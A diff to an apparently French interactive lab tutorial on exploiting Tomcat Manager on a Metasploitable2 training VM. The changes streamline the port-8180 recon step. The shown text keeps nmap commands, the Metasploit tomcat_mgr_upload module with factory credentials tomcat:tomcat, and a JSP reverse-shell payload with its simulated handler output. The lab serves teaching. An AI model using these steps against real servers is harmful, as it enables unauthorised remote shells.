@@ -859,8 +859,8 @@
       <div class="playbook">
         <div class="playbook-row">
           <div class="playbook-num">1</div>
-          <div class="playbook-what"><strong>Reconnaissance ciblée</strong><span>nmap -sV -p 8080, puis -p 8180</span></div>
-          <div class="playbook-why">Confirmer la présence du serveur d'application et sa version exacte — le port conventionnel peut être fermé, il faut savoir élargir.</div>
+          <div class="playbook-what"><strong>Reconnaissance ciblée</strong><span>nmap -sV -p 8180</span></div>
+          <div class="playbook-why">Confirmer la présence du serveur d'application et sa version exacte sur le port où il écoute réellement.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">2</div>
@@ -875,7 +875,7 @@
         <div class="playbook-row">
           <div class="playbook-num">4</div>
           <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / RPORT / HttpUsername / HttpPassword</span></div>
-          <div class="playbook-why">Fournir la cible, le port réel du manager, et les identifiants d'usine — c'est cette étape qui matérialise la faille de configuration.</div>
+          <div class="playbook-why">Fournir la cible, le port du manager, et les identifiants d'usine — c'est cette étape qui matérialise la faille de configuration.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">5</div>
@@ -889,21 +889,16 @@
         <div class="step">
           <div class="step-num">1</div>
           <h3>Identifier le serveur d'application</h3>
-          <p class="step-sub">Tomcat est presque toujours exposé sur 8080 — sauf quand l'admin l'a déplacé. On vérifie d'abord le port conventionnel, puis on élargit.</p>
+          <p class="step-sub">Tomcat écoute ici sur le port <strong>8180</strong> — on cible directement ce port pour confirmer le service et sa version.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> nmap -sV -p 8080 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 8080 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">PORT     STATE  SERVICE    VERSION</span>
-<span class="out">8080/tcp closed http-proxy</span>
-
-<span class="prompt">$</span> nmap -sV -p 8180 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 8180 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+            <pre><span class="prompt">$</span> nmap -sV -p 8180 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 8180 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
 <span class="out">PORT     STATE SERVICE VERSION</span>
 <span class="out">8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span></pre>
           </div>
           <div class="explain">
-            <span class="k">pourquoi 8180</span><span class="v">Sur Metasploitable2, Tomcat n'écoute pas sur le <strong>8080</strong> conventionnel mais sur <strong>8180</strong>. Un scan limité au port par défaut donnerait un faux négatif et ferait conclure à tort que le service est absent.</span>
-            <span class="k">à retenir</span><span class="v">Ne jamais conclure « pas de service » sur un seul port. Un scan large (<code>nmap -sV -p-</code>) ou le balayage des ports alternatifs usuels (8000, 8081, 8180, 8888) évite ce piège.</span>
             <span class="k">Tomcat/Coyote</span><span class="v"><strong>Coyote</strong> est le connecteur HTTP de Tomcat. La version 1.1 confirme un serveur ancien et probablement non durci.</span>
+            <span class="k">à retenir</span><span class="v">Contrairement à vsftpd ou distccd, on ne cherche pas ici une faille dans le code du service. On cherche un <strong>panneau d'administration</strong> exposé.</span>
           </div>
         </div>
 
@@ -953,7 +948,7 @@
           </div>
           <div class="explain">
             <span class="k">module</span><span class="v">Le chemin <strong>multi/http</strong> signifie que le module gère plusieurs chemins d'accès au manager. Il utilise les variables <strong>HttpUsername</strong> et <strong>HttpPassword</strong> pour s'authentifier.</span>
-            <span class="k">RPORT</span><span class="v">Le module cible par défaut le port <strong>8080</strong>. Sur cette cible, il faut explicitement le passer à <strong>8180</strong> — sans cette étape, l'authentification échoue avant même d'atteindre la page de login.</span>
+            <span class="k">RPORT</span><span class="v">Le port du manager sur cette cible est <strong>8180</strong>, à préciser dans la configuration du module.</span>
             <span class="k">payload</span><span class="v">Le payload par défaut <strong>java/jsp_shell_reverse_tcp</strong> est une page JSP malveillante encapsulée dans un fichier WAR. Une fois déployée, cette page renvoie un shell à l'attaquant.</span>
             <span class="k">déploiement</span><span class="v">Le module ne contourne aucun filtre : il utilise l'API légitime du manager. C'est précisément parce que le manager <strong>est fait pour ça</strong> que l'attaque fonctionne.</span>
           </div>
@@ -1005,8 +1000,7 @@
       <div class="cheat-group">
         <h4>reconnaissance</h4>
         <table class="cheat">
-          <tr><td class="cmd">nmap -sV -p 8080 IP</td><td class="desc">port conventionnel — fermé sur Metasploitable2</td></tr>
-          <tr><td class="cmd">nmap -sV -p 8180 IP</td><td class="desc">port réel de Tomcat sur cette cible</td></tr>
+          <tr><td class="cmd">nmap -sV -p 8180 IP</td><td class="desc">identifier le serveur d'application et sa version</td></tr>
         </table>
       </div>
 
@@ -1016,7 +1010,7 @@
           <tr><td class="cmd">use exploit/multi/http/tomcat_mgr_upload</td><td class="desc">module dédié Tomcat Manager</td></tr>
           <tr><td class="cmd">set HttpUsername tomcat</td><td class="desc">identifiant d'usine</td></tr>
           <tr><td class="cmd">set HttpPassword tomcat</td><td class="desc">mot de passe d'usine</td></tr>
-          <tr><td class="cmd">set RPORT 8180</td><td class="desc">port réel de Tomcat sur Metasploitable2</td></tr>
+          <tr><td class="cmd">set RPORT 8180</td><td class="desc">port du manager</td></tr>
         </table>
       </div>
 
@@ -1155,9 +1149,9 @@
 <script>
   const steps = [
     { kind:"type", context:"kali@kali", prompt:"$",
-      task:"Identifie le serveur d'application — il n'écoute pas sur le port conventionnel",
+      task:"Identifie le serveur d'application et sa version",
       accepted:["nmap -sv -p 8180 192.168.56.20"],
-      hint:"Tomcat est en général sur le port 8080, mais sur cette cible ce port est fermé. Élargis le scan aux ports alternatifs usuels des serveurs d'application (8000, 8081, 8180, 8888) — un seul répond.",
+      hint:"Il te faut confirmer la présence du serveur d'application sur son port d'écoute (8180 sur cette cible). Utilise l'outil de scan standard avec l'option qui détecte les versions de service.",
       output:[
         {t:"PORT     STATE SERVICE VERSION", c:"o"},
         {t:"8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1", c:"o", id:"hl-tomcat-port"}
@@ -1172,7 +1166,7 @@
     { kind:"type", context:"kali@kali", prompt:"$",
       task:"Utilise Metasploit pour exploiter le manager Tomcat avec les identifiants par défaut",
       accepted:["msfconsole"],
-      hint:"Le module est déjà prêt dans Metasploit. Commence par lancer la console, puis charge le module avec `use exploit/multi/http/tomcat_mgr_upload`, configure la cible, le port réel (8180), et les identifiants d'usine (tomcat:tomcat).",
+      hint:"Le module est déjà prêt dans Metasploit. Commence par lancer la console, puis charge le module avec `use exploit/multi/http/tomcat_mgr_upload`, configure la cible, le port (8180), et les identifiants d'usine (tomcat:tomcat).",
       output:[
         {t:"[*] Started reverse TCP handler on 192.168.56.10:4444 ", c:"o"},
         {t:"[*] Automatically selected target: Java Universal", c:"ok"},
